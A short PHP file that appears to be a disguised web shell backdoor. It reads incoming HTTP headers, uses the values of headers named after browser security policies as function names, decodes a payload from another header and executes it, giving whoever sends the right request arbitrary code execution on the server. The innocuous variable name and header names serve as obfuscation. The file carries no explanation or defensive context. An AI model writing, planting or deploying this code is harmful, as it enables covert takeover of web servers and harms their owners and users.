<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $dbx_convert = $_HEADERS['Feature-Policy']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Large-Allocation']));
    $dbx_convert();
}